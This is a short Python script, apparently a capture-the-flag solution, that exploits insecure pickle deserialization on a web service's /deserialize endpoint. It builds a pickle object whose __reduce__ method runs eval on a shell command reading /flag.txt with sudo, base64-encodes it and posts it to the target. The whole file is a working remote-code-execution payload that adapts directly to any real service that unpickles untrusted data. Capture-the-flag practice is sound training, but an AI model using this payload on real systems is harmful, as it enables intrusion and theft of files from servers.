#!/usr/bin/env python3
import pickle, os, base64
import requests


class P(object):
    def __reduce__(self):
        return (
            eval,
            (
                "__import__('os').popen('sudo /usr/bin/cut -d \"\" -f1 /flag.txt').read()",
            ),
        )


def main():
    pickledPayload = base64.b64encode(pickle.dumps(P())).decode()
    print(f"[*] Payload: {pickledPayload}")

    URL = "http://ctf.compfest.id:7304/deserialize"
    cookie = {"data": pickledPayload}

    print("[*] Request result:")
    orderRequestResult = requests.post(URL, json=cookie)
    print(orderRequestResult.text)


if __name__ == "__main__":
    main()
